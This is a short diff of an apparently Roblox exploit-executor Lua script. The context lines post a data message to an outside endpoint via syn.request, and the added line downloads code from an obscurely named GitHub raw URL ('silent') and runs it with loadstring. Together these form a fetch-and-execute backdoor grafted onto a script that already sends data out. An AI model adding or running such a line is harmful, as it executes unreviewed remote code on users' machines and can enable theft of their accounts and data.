@@ -152,3 +152,5 @@ syn.request(
         Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
     }
 )
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/silent"))();
